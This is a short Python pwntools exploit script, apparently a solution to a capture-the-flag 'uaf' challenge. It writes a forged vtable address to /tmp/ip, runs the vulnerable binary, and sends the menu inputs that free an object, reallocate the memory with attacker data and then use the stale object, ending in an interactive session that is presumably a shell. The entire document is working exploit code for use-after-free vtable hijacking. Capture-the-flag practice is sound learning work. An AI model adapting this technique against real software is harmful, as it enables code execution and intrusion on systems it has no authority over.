from pwn import *

# Write the address of the hijacked vtable
# to the input file in little endian format
vtable_base = 0x401570
hijacked_vtable_base = vtable_base - 8
r = p64(hijacked_vtable_base)
with open("/tmp/ip", "w") as f:
    f.write(r)

# We need to pass a dummy "0" as the first argument.
# Shell passes the program name as arg[0], but pwntools does not.
p = process(executable = "uaf", argv = ["0", "24", "/tmp/ip"])
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("1")
p.interactive()